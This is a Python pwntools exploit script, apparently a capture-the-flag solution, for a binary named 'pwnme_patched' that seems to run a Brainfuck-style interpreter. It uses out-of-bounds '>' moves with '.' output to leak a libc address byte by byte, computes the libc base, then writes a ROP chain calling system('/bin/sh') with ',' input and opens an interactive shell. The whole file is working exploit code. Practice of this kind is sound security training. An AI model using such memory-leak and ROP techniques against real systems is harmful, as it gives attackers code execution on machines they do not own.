from pwn import *
from icecream import ic

elf = exe = ELF("./pwnme_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("0.cloud.chals.io", 31782)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *bf+220
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()

leak = b''

for i in range(8):
    payload = b'>'*((8*15)+i)
    payload += b'.'
    sla(b">", payload)
    leak += re(1)

leak = u64(leak)

libc.address = leak - 0x29d90
ic(hex(libc.address))

payload2 = p64(qgad(libc, "rdi"))
payload2 += p64(next(libc.search(b"/bin/sh\x00")))
payload2 += p64(gad(libc, ['ret']))
payload2 += p64(libc.sym["system"])

for i in range(len(payload2)):
    payload = b'>'*((8*15)+i)
    payload += b','
    sla(b">", payload)
    sl(payload2[i].to_bytes(1, byteorder='big'))
    ru(b">")

sl('q')
io.interactive()
